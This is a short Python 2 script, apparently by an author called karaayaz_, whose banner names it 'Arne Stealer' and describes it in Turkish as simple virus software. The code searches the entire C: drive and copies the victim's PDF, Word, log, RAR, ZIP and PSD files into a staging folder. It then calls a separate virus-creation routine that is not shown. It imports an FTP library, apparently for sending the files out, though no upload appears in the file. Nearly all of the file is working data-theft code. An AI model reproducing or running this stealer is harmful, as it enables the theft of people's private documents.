# -*- coding: cp1254 -*-
print """Arne Stealer
 _   __                   ___                  
| | / /                  / _ \                 
| |/ /  __ _ _ __ __ _  / /_\ \_   _  __ _ ____
|    \ / _` | '__/ _` | |  _  | | | |/ _` |_  /
| |\  \ (_| | | | (_| | | | | | |_| | (_| |/ / 
\_| \_/\__,_|_|  \__,_| \_| |_/\__, |\__,_/___|
                                __/ |          
                               |___/
Basit Virus Yazilimi                | karaayaz_"""

# Modüller
import os
import os.path
import shutil
import getpass
import fnmatch
import ftplib
import threading
import virus

############# Dosya Dizinleri #############
cw = "\Ayaz\Arne"
if not os.path.exists(cw):
    os.makedirs(cw)

# C: Diski İçerisinde Tarama
def search(dir, ext):
    for root, dirs, files in os.walk(dir):
        for name in files:
            if fnmatch.fnmatch(name, ext):
                filename = os.path.join(root, name)
                yield filename

# Bulunan Dosyaları Kopyala
# PDF Uzantılı Dosyalar
for filename in search("C:/", "*.pdf"):
    try:
        shutil.copy2(filename, cw)
    except:
        pass

# Log Uzantılı Dosyalar
for filename in search("C:/", "*.log"):
    try:
        shutil.copy2(filename, cw)
    except:
        pass

# Doc Uzantılı Dosyalar
for filename in search("C:/", "*.doc"):
    try:
        shutil.copy2(filename, cw)
    except:
        pass

# Docx Uzantılı Dosyalar
for filename in search("C:/", "*.docx"):
    try:
        shutil.copy2(filename, cw)
    except:
        pass

# Rar Uzantılı Dosyalar
for filename in search("C:/", "*.rar"):
    try:
        shutil.copy2(filename, cw)
    except:
        pass

#Zip Uzantılı Dosyalar
for filename in search("C:/", "*.zip"):
    try:
        shutil.copy2(filename, cw)
    except:
        pass

#PSD Uzantılı Dosyalar
for filename in search("C:/", "*.psd"):
    try:
        shutil.copy2(filename, cw)
    except:
        pass

virus.olustur()
